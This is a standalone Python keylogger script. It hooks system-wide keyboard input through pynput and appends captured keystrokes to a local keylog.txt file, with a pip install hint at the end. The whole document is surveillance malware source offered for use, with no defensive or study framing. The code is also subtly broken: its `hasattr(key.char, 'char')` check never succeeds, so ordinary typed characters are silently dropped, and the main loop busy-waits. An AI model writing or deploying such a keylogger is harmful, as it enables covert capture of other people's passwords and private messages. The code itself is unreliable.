import pynput.keyboard

def process_keypress(key):
    try:
        # If the key pressed can be represented as text, record it.
        if hasattr(key.char, 'char'):
            with open('keylog.txt', 'a') as f:
                f.write(f"{key.char}")
    except AttributeError:
        # For special keys like Shift or Enter
        if str(key) == "Key.space":
            with open('keylog.txt', 'a') as f:
                f.write(" ")
        elif str(key) in ["Key.enter", "Key.tab"]:
            with open('keylog.txt', 'a') as f:
                f.write("\n")
        else:
            # Record the actual key object if needed
            with open('keylog.txt', 'a') as f:
                f.write(f"[{str(key)}]")

def main():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keypress)
    
    print("[+] Listening for keystrokes...")
    keyboard_listener.start()
    
    # Keep the script running
    try:
        while True:
            pass
    except KeyboardInterrupt:
        keyboard_listener.stop()

if __name__ == "__main__":
    main()

# Dont forget to install the required library with: pip install pynput